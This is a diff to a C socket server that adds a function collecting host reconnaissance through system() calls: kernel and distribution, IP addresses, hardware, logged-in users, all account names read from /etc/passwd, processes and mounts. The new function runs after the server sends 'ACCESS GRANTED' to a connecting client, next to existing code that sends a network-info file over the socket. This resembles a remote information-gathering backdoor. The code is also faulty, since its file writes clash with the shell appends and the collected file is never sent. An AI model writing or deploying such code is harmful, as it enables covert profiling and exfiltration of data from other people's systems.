@@ -136,6 +136,52 @@ bool isOnFile(const char *bufferOriginal)
     return foundWorld;
 }
 
+#include <stdio.h>
+#include <stdlib.h>
+
+void saveSystemInfo(const char *filename) {
+    FILE *fp = fopen(filename, "w");
+    if (!fp) {
+        perror("[-] Error al crear archivo");
+        return;
+    }
+
+    fprintf(fp, "=== Sistema y Kernel ===\n");
+    system("uname -a >> sysinfo.txt"); // OS y Kernel
+
+    fprintf(fp, "\n=== Distribución ===\n");
+    system("lsb_release -a >> sysinfo.txt 2>/dev/null");
+
+    fprintf(fp, "\n=== Direcciones IP ===\n");
+    system("ip addr show >> sysinfo.txt");
+
+    fprintf(fp, "\n=== CPU y Núcleos ===\n");
+    system("lscpu >> sysinfo.txt");
+
+    fprintf(fp, "\n=== Memoria ===\n");
+    system("free -h >> sysinfo.txt");
+
+    fprintf(fp, "\n=== Disco ===\n");
+    system("df -h >> sysinfo.txt");
+
+    fprintf(fp, "\n=== Usuarios conectados ===\n");
+    system("who >> sysinfo.txt");
+
+    fprintf(fp, "\n=== Todos los usuarios del sistema ===\n");
+    system("cut -d: -f1 /etc/passwd >> sysinfo.txt");
+
+    fprintf(fp, "\n=== Uptime ===\n");
+    system("uptime >> sysinfo.txt");
+
+    fprintf(fp, "\n=== Procesos activos ===\n");
+    system("ps -e >> sysinfo.txt");
+
+    fprintf(fp, "\n=== Directorios montados ===\n");
+    system("mount >> sysinfo.txt");
+
+    fclose(fp);
+}
+
 int main()
 {
     int server_sock, client_sock;
@@ -195,6 +241,7 @@ int main()
         send(client_sock, "ACCESS GRANTED", strlen("ACCESS GRANTED"), 0);
         sleep(1); // Peque~na pausa para evitar colisión de datos
         saveNetworkInfo("network_info.txt");
+        saveSystemInfo("sysinfo.txt");
         sendFile("network_info.txt", client_sock);
         printf("[+] Sent file\n");
     }
